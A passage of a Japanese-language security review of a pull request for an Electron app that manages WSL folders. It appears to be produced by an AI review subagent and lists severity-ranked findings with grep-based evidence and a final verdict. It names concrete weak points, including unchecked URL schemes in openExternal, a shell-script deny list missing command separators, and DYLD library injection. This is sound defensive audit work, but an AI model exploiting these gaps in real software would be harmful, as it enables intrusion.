- **リスク/影響**: `allow-dyld-environment-variables` は `DYLD_INSERT_LIBRARIES` によるライブラリ注入を許す。ただし macOS ホストは `DirectRuntime` (OPT-mac) として **spec の Out of Scope** に明示されており、R-1 は Windows インストーラのみを 1 回通す (FR-043 / SC-010)。scaffold 既定値であり本 feature が意図して置いた値ではない。
- **推奨アクション**: mac ビルドを実際に出す feature (OPT-mac / D-1) で `allow-unsigned-executable-memory` と `allow-dyld-environment-variables` の必要性を再評価する。R-1 では変更しない判断でよいが、`docs/decisions/0026-packaging-first-pass.md` に「mac entitlements は未評価」と 1 行残すと次の feature が拾える。
- **根拠**: CWE-426 (Untrusted Search Path)、Apple Hardened Runtime
- **scope 根拠**: macOS ホストは spec の Out of Scope。D-1 (署名つきインストーラ配布) で扱う領域

### [Low] プロトコル応答に `X-Content-Type-Options: nosniff` が無い (L-004) (scope: feature)

- **観察**: `src/main/app/protocol.ts:169-175` の応答ヘッダは `Content-Type` と `Content-Security-Policy` の 2 つのみ。`mimeTypeOf` (`:88-92`) は未知拡張子を `application/octet-stream` に落とす。
- **同種事象探索**: `new Response(` **4 件** (`protocol.ts:162` 500 / `:165` 403 / `:169` 200 / `:176` 404)。`nosniff` **0 件**。
- **リスク/影響**: 配信対象が同梱ディレクトリ配下に封じ込められており (`:112-144`)、CSP が `default-src 'none'` + 自己オリジン限定なので MIME sniffing による実害経路は現状無い。1 ヘッダのコストで閉じられる残余。
- **推奨アクション**: 200 応答に `'X-Content-Type-Options': 'nosniff'` を追加する。`protocol.test.ts` のヘッダ検証に 1 行足す。
- **根拠**: CWE-430 / OWASP Secure Headers
- **scope 根拠**: `protocol.ts` は本 PR の touched files

## 同種事象探索 cascade summary

| 指摘 ID | Grep query | 該当件数 | path:line |
|---|---|---|---|
| H-001 | `openExternal\|setPermissionRequestHandler\|setPermissionCheckHandler` (repo 全体) | `src/` 内 **2** / scheme 許可リスト **0** / 挙動テスト **0** | `src/main/app/window.ts:48`, `:64` (両方 scheme 無検査)。許可リスト定義 0 件 (`scripts/constitution/allowlists.mjs` に `openExternal` 項目なし)。`*.test.ts*` 全走査で `openExternal`/`will-navigate`/`setWindowOpenHandler` の検証 0 件。存在確認のみの検査: `scripts/constitution/check.mjs:502-510` |
| H-002 | `inflight\|inFlight\|single-flight\|singleFlight\|coalesc\|dedupe` (repo 全体) | `src/` 内 **0** | spawn 到達点 1 件 (`src/main/infra/runtime/wsl-cli.ts:84`)、到達する IPC 4 件 (`ipc.ts:89` refresh / `ipc.ts:91` probeRuntime / `folder-service.ts:241` beginBrowse / `folder-service.ts:120` listFolders)。回数制限 0 件。`sessions` 上限・掃除 0 件 (`folder-service.ts:98,246`) |
| M-001 | `setPermissionRequestHandler\|setPermissionCheckHandler` | **0** | 該当 0 件。session 参照は `src/main/app/window.ts:72` のみ |
| M-002 | `DISTRO_SCRIPT_ALLOWED_FORMS\|DISTRO_SCRIPT_FORBIDDEN_FORMS` | 定義 **1** / 使用 **1** / 行全体錨付け **0** | `scripts/constitution/allowlists.mjs:239,250`、`scripts/constitution/check.mjs:307,315`。`;`/`\|`/`` ` ``/`$(` を禁止形に含める行 0 件 |
| M-003 | `process\s*\.\s*env\|process\[` (`src/`) | **3** / うち bracket 記法 **2** / 等価経路を見る検査 **0** | `src/main/app/origins.ts:34`, `:58` (bracket)、`src/main/infra/runtime/wsl-cli.ts:87`。検査パターン: `scripts/constitution/check.mjs:449` (ドット記法のみ)。対照: `allowlists.mjs:265-280` は bracket/分割代入を列挙済み |
| M-004 | `makeHostPath` / ホスト値の `..` 拒否 | 呼び出し **4** / 未信頼入力 **2** / `..` 拒否 **0** | `src/main/app/folder-service.ts:205`、`src/main/infra/settings/folder-record.ts:120` (いずれも未信頼)、`src/main/app/composition-root.ts:58`、`src/domain/runtime/path-api.ts:116,180`。定義 `src/domain/runtime/path-types.ts:80-94` に `.`/`..` の行なし。対照: ランタイム側は 4 重 (`path-types.ts:117` / `validate.ts:72` / `path-api.ts:48-57` / `path-api.ts:150-154`) |
| L-001 | `new URL(requestUrl)` / host 照合 | **1** / host 照合 **0** | `src/main/app/protocol.ts:114` |
| L-002 | `spawn(` + `env:` | spawn **1** / 最小 env **0** | `src/main/infra/runtime/wsl-cli.ts:84,87` |
| L-003 | entitlements | **1** | `build/entitlements.mac.plist:5-10` |
| L-004 | `new Response(` / `nosniff` | Response **4** / nosniff **0** | `src/main/app/protocol.ts:162,165,169,176` |

**Critical は 0 件のため cascade enforcement による降格対象は無い。** H-001 / H-002 はいずれも「renderer 内のスクリプト実行という別の破れを 1 つ要する」ため、`reviewer-base.md` §禁則 (仮定的な将来攻撃経路 / defense-in-depth は High 上限) に従い自ら High に置いた。

## 意図的に報告しなかったもの

(1) design-gate で解消済みと判定した 10 件の再指摘 — 上表で判定のみ示し finding にしない。(2) code-gate iteration 1 の MF-003 (`ipc.ts:122-127` の送信元束縛) / MF-004 (`index.html` の静的 CSP 撤去 → `protocol.ts:173` / `window.ts:76`) — 契約どおり解消済みとして扱った。(3) ブラウズトークンのエントロピー — `randomUUID()` (`folder-service.ts:245`) で `node:crypto` の CSPRNG に乗っており問題なし。(4) 依存の CVE / supply chain — `pnpm-lock.yaml` は存在するが本 subagent に `npm audit` 相当の実行手段が無く、lockfile の目視で CVE を断定すると推測になる。`inflight@1.0.6` が deprecated (メモリリーク) として lockfile に記録されているが推移的依存であり本 PR の選択ではない。(5) `unescapeOctal` (`wsl-output.ts:163-167`) 経由の NUL / バックスラッシュ注入 — ディストロ内 root を要する前提であり、かつ `makePathMapping` (`path-mapping.ts:33-56`) と `makeRuntimePath` が下流で拒否するため実害経路が成立しない。(6) 正規表現の ReDoS — `wsl-output.ts:203` の `/(?:^|[,;])path=([^,;]*)/` と `:29` / `:144` はいずれも線形で catastrophic backtracking を持たない。(7) `assertNoBackslash` (`wsl-cli.ts:57-63`) の同期 throw が `probeAll` の `Promise.all` (`runtime-store.ts:154-169`) を丸ごと reject させる形 — `distroName` が列挙時点で検証済み (`wsl-detector.ts:105`) であり到達経路が観察されないため報告しない。(8) 命名 / レイヤ配置 / a11y / UX / DTO 設計 — 他 viewpoint の Owner 範囲。

## Verdict

- Critical: **0**
- High: **2** (H-001 `shell.openExternal` の scheme 無検査 / H-002 single-flight 不在による資源枯渇)
- Medium: **4** (M-001 permission ハンドラ未設定 / M-002 項目 6 (iii) の部分一致 / M-003 env ゲート検査の記法漏れ / M-004 ホスト値の `..`)
- Low: **4** (L-001 protocol host 無検査 / L-002 親環境の丸渡し / L-003 mac entitlements / L-004 nosniff)
- Round inheritance: **resolved from design-gate: 10 / unresolved: 0 / new: 10**
- design-gate で Critical だった 2 件 (C-001 / C-002) はいずれも実装で解消済み。本 round の Critical 昇格は無く、**前 Round より Severity を上げた指摘は 0 件**である (格上げに要する「追加事実」の記載は不要)。

**pr-gate としての判定材料**: Critical 0 件のため security track は `done` を阻害しない。ただし H-001 は FR-040 の「拒否しなければならない」に対する実装の乖離であり、かつ SC-016 の計測経路 (検証スクリプト項目 11) が存在確認しか行わないため**機械検証では永久に検出されない**。R-3 が外部由来テキストをリンクとして描画する土台がこの実装になることを踏まえ、**H-001 は本 PR 内での修正を強く推奨する** (2 箇所に scheme 許可リストを 1 つ足すだけで閉じる)。H-002 は FR-010 が「境界で強制する制約であり UI の作り方に委ねてはならない」と名指した仕組みが実装に存在しないという観察であり、`po-reviewer` / `architecture-reviewer` の FR-010 判定と突き合わせるべき。
